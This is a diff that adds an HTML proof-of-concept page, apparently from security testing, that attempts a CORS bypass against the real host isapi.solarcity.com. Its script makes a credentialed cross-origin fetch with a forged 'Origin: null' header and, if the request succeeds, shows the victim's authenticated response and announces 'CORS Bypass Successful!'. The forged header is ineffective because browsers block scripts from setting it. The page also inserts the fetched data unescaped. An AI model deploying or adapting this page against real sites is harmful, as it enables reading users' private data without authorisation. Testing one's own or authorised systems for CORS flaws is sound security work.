@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>CORS Test - isapi.solarcity.com</title>
+</head>
+<body>
+<script>
+// Test if we can read cross-origin content
+fetch('https://isapi.solarcity.com/', {
+    method: 'GET',
+    headers: {
+        'Origin': 'null'
+    },
+    credentials: 'include'
+})
+.then(response => response.text())
+.then(data => {
+    console.log('Successfully read data:', data);
+    document.body.innerHTML = '<h1>CORS Bypass Successful!</h1><pre>' + data + '</pre>';
+})
+.catch(error => {
+    console.log('Error:', error);
+    document.body.innerHTML = '<h1>CORS Blocked</h1><pre>' + error + '</pre>';
+});
+</script>
+</body>
+</html>
